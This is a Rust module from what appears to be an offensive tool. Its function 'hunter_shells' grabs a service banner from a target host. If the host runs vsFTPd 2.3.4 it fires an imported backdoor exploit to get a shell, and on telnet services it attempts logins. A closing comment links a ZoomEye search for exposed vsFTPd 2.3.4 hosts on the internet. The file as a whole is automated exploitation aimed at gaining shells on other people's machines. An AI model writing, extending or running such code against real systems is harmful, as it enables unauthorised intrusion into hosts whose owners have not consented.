use std::io::{self, Read};
use std::net::SocketAddr;
use std::thread::sleep;
use std::time::Duration;
use std::{
    error::Error,
    net::TcpStream,
};

use crate::exploits::telnet::try_telnet_login;
use crate::exploits::vsftpd_234::{vsftpd_234_exploit, };


pub fn hunter_shells(ip: String,port:u32) -> Result<(), Box<dyn Error>> {
    
    let host = format!("{}:{}",ip,port);
    let add_host = host.parse::<SocketAddr>()?;
    let timeout = Duration::from_secs(5);
    
    let mut conn = match TcpStream::connect_timeout(&add_host, timeout) {
            Ok(connection) => {
            println!("{}:{} estableshd connection",ip,port);
            connection
    },
    Err(_) => {
            println!("{}:{} falied connection",ip,port);
            return Err(Box::new(io::Error::new(
                io::ErrorKind::Other,
                "Failed to connect",
            )));
        }
    };

    sleep(Duration::from_secs(2));

    conn.set_read_timeout(Some(Duration::new(3, 0)))?;
    let mut buffer_recved = [0; 1024];

    let qunatity_of_bytes = conn.read(&mut buffer_recved)?;
    let banner = String::from_utf8_lossy(&buffer_recved[..qunatity_of_bytes]);

    println!("{ip}:{port} banner : {}", banner);
    match banner.as_ref() {
        b if b.contains("vsFTPd 2.3.4") => {
            println!("possibly vulnerable ...");
            println!("runing exploit vsftpd 2.3.4 ...");

            let response_exploit = vsftpd_234_exploit(ip.as_str(), port);

            match response_exploit {
                Ok(res) => println!("[ 200 ] - [ {ip}:{port} ] - get shell successfull [ {res} ]"),
                Err(_) => {}
            }
        },
        b if b.contains("telnet") => {
            match try_telnet_login(&ip, port) {
                Ok(res) => println!("{res}"),
                Err(_) => {}
            }
        },
        // b if b.contains("SSH") => {
        //     match try_ssh_login(&ip, port) {
        //         Ok(res) => println!("{res}"),
        //         Err(_) => {}
        //     }
        // },
        _ => {
            // println!("{}", banner.as_ref())
        },
    };
    if port == 23 {
        match try_telnet_login(&ip, port) {
            Ok(res) => println!("{res}"),
            Err(_) => {}
        }
    }
    // let message = "hello";
    // conn.write_all(message.as_bytes());

    Ok(())
}


//https://www.zoomeye.hk/searchResult?q=%22vsFTPd+2.3.4%22&page=1&pageSize=50